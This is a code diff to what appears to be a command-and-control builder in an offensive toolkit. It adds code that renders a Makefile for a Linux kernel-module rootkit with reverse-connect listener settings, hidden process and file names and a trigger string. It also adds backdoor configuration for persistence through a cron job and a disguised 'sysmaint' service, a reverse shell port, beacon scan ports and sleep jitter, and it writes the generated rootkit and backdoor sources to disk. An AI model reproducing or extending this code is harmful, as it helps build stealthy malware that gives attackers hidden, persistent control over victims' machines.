@@ -21,6 +21,7 @@ from datetime import datetime
 from pathlib import Path
 from typing import Any
 
+from core.config import load_payload
 from core.validators import check_lhost, check_lport
 from modules.metrics import REGISTRY
 from utils import (
@@ -229,6 +230,62 @@ def _go_string_list(urls: list[str]) -> str:
     if not urls:
         return '""'
     return ", ".join(f'"{u}"' for u in urls)
+
+
+_DEFAULT_SCAN_PORTS: tuple[int, ...] = (22, 80, 443, 445, 3389, 8080, 8443)
+
+
+def _lkm_makefile_text(listener_ip: str, listener_port: str) -> str:
+    """Render the LKM rootkit Makefile with per-deployment listener values.
+
+    Args:
+        listener_ip: Target-attached reverse-connect address.
+        listener_port: Reverse-connect port.
+
+    Returns:
+        kbuild Makefile text overriding the guarded rootkit defaults.
+    """
+    return (
+        "obj-m += rootkit.o\n"
+        "\n"
+        f'LISTENER_IP ?= {listener_ip}\n'
+        f'LISTENER_PORT ?= {listener_port}\n'
+        "HIDDEN_PROCESS_NAME ?= rootkit_proc\n"
+        "HIDDEN_FILE_NAME ?= rootkit_file\n"
+        "SPECIAL_STRING ?= knoires-lz\n"
+        "SPECIAL_STRING_PORT ?= 4444\n"
+        "\n"
+        "ccflags-y += \\\n"
+        '\t-DLISTENER_IP=\\"$(LISTENER_IP)\\" \\\n'
+        "\t-DLISTENER_PORT=$(LISTENER_PORT) \\\n"
+        '\t-DHIDDEN_PROCESS_NAME=\\"$(HIDDEN_PROCESS_NAME)\\" \\\n'
+        '\t-DHIDDEN_FILE_NAME=\\"$(HIDDEN_FILE_NAME)\\" \\\n'
+        '\t-DSPECIAL_STRING=\\"$(SPECIAL_STRING)\\" \\\n'
+        "\t-DSPECIAL_STRING_PORT=$(SPECIAL_STRING_PORT)\n"
+        "\n"
+        "all:\n"
+        "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n"
+        "\n"
+        "clean:\n"
+        "\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n"
+    )
+
+
+def _beacon_scan_ports_csv(params: dict[str, Any]) -> str:
+    """Resolve the beacon discovery port list as a CSV string.
+
+    Args:
+        params: Payload parameters backing the beacon build.
+
+    Returns:
+        Comma-separated port numbers matching the beacon config builder.
+    """
+    try:
+        from modules.beacon_config_builder import BeaconConfigBuilder
+
+        return ",".join(str(port) for port in BeaconConfigBuilder(params).build().beacon_scan_ports)
+    except Exception:
+        return ",".join(str(port) for port in _DEFAULT_SCAN_PORTS)
 
 
 def _parse_go_version(text: str) -> tuple[int, int, int] | None:
@@ -456,9 +513,12 @@ class C2Builder:
         Returns a dict with build artefacts and metadata so the caller can
         update shell state (``c2_url``, ``c2_clientid``, ``c2_auth``).
         """
+        from core.session_secrets import ensure_session_secrets
+
         start_time = time.monotonic()
         path = os.getcwd()
         lport_param = str(self.params["c2_port"])
+        ensure_session_secrets(rotate=False)
 
         if use_tunnel:
             tunnel_url = ""
@@ -627,6 +687,18 @@ chmod +x /tmp/stub && \
             "protocol": protocol,
             "useragent": user_agent,
             "key": aes_key_hex,
+            "rat_key": str(load_payload().get("rat_key", "") or ""),
+            "session_magic": str(load_payload().get("session_magic", "") or ""),
+            "rhost": str(self.params.get("rhost", "") or ""),
+            "sleep_jit_enabled": str(self.params.get("sleep_jit_enabled", "True")),
+            "sleep_jit_pct_min": str(self.params.get("sleep_jit_pct_min", "30")),
+            "sleep_jit_pct_max": str(self.params.get("sleep_jit_pct_max", "60")),
+            "sleep_activation_delay_min": str(self.params.get("sleep_activation_delay_min", "0s")),
+            "sleep_activation_delay_max": str(self.params.get("sleep_activation_delay_max", "0s")),
+            "persistence_cron_schedule": str(self.params.get("persistence_cron_schedule", "*/5 * * * *")),
+            "persistence_service_name": str(self.params.get("persistence_service_name", "sysmaint")),
+            "reverse_shell_port": str(self.params.get("reverse_shell_port", "") or ""),
+            "beacon_scan_ports": _beacon_scan_ports_csv(self.params),
             "stealth": "True",
             "user_agent_1": user_agent_1,
             "user_agent_2": user_agent_2,
@@ -675,6 +747,16 @@ chmod +x /tmp/stub && \
 
         backdoor_content = _render_template(_read(filek), ctx)
         _write("sessions/b.c", backdoor_content)
+
+        lkm_rootkit = f"{path}/modules/rootkit/rootkit.c"
+        if os.path.isfile(lkm_rootkit):
+            lkm_target = str(self.params.get("rhost", lhost))
+            lkm_content = _render_template(_read(lkm_rootkit), {**ctx, "lhost": lkm_target})
+            _write(f"{path}/sessions/rootkit_lkm.c", lkm_content)
+            _write(
+                f"{path}/sessions/rootkit_Makefile",
+                _lkm_makefile_text(lkm_target, str(self.params.get("rport", "3333"))),
+            )
 
         server_content = _render_template(_read(files), {**ctx, "lhost": rhost})
         _write("sessions/server.c", server_content)
